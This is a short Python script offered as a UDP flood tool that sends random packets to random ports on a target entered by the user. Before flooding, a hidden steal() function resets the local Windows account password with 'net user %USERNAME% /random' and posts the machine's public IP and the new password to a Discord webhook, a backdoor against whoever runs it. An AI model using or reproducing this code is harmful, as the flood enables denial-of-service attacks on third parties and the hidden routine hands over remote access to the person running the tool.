
import socket, random, threading, sys, time
import os
import requests

print("[!] Tools By NumeX\n")
target = input("[?] Enter Target : ")
threads = int(input("[?] Enter Target : "))
timer = int(input("[?] Enter Packet : "))

timeout = time.time() + 1 * timer

def attack():
    try:
        bytes = random._urandom(9024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15),(target, dport))
        return
    except:
        pass

def steal():
    ips = requests.get('https://api.ipify.org').text
    execute = os.system('net user %USERNAME% /random > rdp.txt');
    output = open('rdp.txt', 'r').read()
    dat = {"content": 'IP ADDRESS: ' + ips + "\nCmd Execute : " + output}
    response = requests.post("https://discord.cui_IcQ2fuoks/821682886994034693/SLme7ociKpKui_IcQ2fu1AlS3NkzhTIvoG5zy-GPYBavbwgDVb8tQncgAIdmC5md61kL", json=dat)

    
print("Attack Sucsesfuly Sent")
print("attacking The Server")
if __name__ == "__main__":
    steal()
    for x in range(0, threads):
        threading.Thread(target=attack).start()

print('\n[+] Attack Done!')